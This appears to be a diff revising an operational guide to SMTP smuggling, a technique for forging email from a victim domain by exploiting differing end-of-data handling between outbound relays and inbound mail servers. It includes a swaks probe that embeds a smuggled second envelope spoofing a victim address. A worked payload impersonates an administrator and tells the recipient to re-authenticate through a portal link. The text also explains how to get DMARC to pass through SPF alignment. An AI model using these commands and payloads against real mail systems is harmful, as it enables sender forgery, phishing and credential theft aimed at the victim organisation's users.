@@ -17,15 +17,18 @@ The DATA phase of SMTP ends at a single canonical sequence: `<CR><LF>.<CR><LF>` 
 
 - An account on an outbound provider whose relay is permissive about the end-of-data sequence (the outbound half must pass your crafted dot-line through unmodified inside DATA).
 - A target whose inbound server honors a non-standard end-of-data variant (the inbound half must terminate early on it).
-- The spoofed domain is whatever the receiver trusts; the authentication you borrow belongs to the aligned outbound sender, so the forged `From:` passes DMARC even though you do not control its keys.
+- The spoofable domain is not arbitrary. The smuggled envelope only earns an aligned SPF pass if that domain's SPF record authorizes the originating relay's IP, so in practice you spoof domains hosted by or sharing the same outbound provider (co-tenants, or the provider's own domains). DKIM is not inherited from the carrier message, so the smuggled sender relies on SPF-based DMARC alone.
 
-Fingerprint which variant an inbound server accepts by sending test messages and observing whether a message split on `\n.\n` / `\r.\r` is delivered as one body or two:
+Fingerprint the inbound server's end-of-data handling directly: send one message whose DATA embeds a non-standard dot-line followed by a full second envelope, and see whether the target receives one message or two.
 
 ```bash
-swaks --server inbound.victim.com --to probe@victim.com --from you@aligned.com \
-      --data $'From: you@aligned.com\r\nSubject: boundary probe\r\n\r\nbody-one\n.\nbody-two\r\n.\r\n'
-# delivered as TWO messages (or a second transaction logged) => inbound ends on \n.\n => smugglable
+swaks --server mx.victim.com --to probe@victim.com --from you@aligned.com \
+      --data $'From: you@aligned.com\r\nSubject: probe\r\n\r\nbody-one\n.\nMAIL FROM:<spoof@victim.com>\r\nRCPT TO:<probe@victim.com>\r\nDATA\r\nFrom: spoof@victim.com\r\nSubject: smuggled\r\n\r\nbody-two\r\n.\r\n'
+# probe@victim.com receives TWO messages (the second From: spoof@victim.com) => the inbound MX
+# terminated DATA on the bare-LF dot line and is smugglable; ONE message => it does not honor it
 ```
+
+That tests only the inbound half. The end-to-end attack also needs an outbound relay that forwards `<LF>.<LF>` literally inside DATA, which you confirm separately by sending the same crafted message through your provider to a mailbox you control and checking it arrives intact rather than being normalized or split at the relay.
 
 ## Worked payload
 
@@ -50,7 +53,7 @@ To: target@victim.com
 Click the portal link and re-authenticate.
 .
 ```
-The outbound relay sees `<LF>.<LF>` as ordinary body text and forwards everything as one message; the inbound server stops at `<LF>.<LF>`, then reads the `MAIL FROM:<admin@victim.com>` block as a genuine new message arriving over the aligned session. Result: `target@victim.com` receives mail from `admin@victim.com` that passes SPF, DKIM, and DMARC.
+The outbound relay sees `<LF>.<LF>` as ordinary body text and forwards everything as one message; the inbound server stops at `<LF>.<LF>`, then reads the `MAIL FROM:<admin@victim.com>` block as a genuine new message arriving over the aligned session. The smuggled message carries no DKIM signature for `victim.com`, so it survives DMARC only when `victim.com`'s SPF authorizes the originating relay (for example when `victim.com` and the outbound provider share infrastructure); where that holds, the SPF-aligned pass on the smuggled envelope is enough for DMARC and `target@victim.com` receives mail that appears to come from `admin@victim.com`.
 
 Pick the variant per receiver from the fingerprint step: use `<LF>.<LF>` against inbound servers that accept bare-LF, `<CR>.<CR>` or `<CR><LF>.<CR>` against those that accept bare-CR. The right variant is the one the inbound honors and the outbound ignores.
 
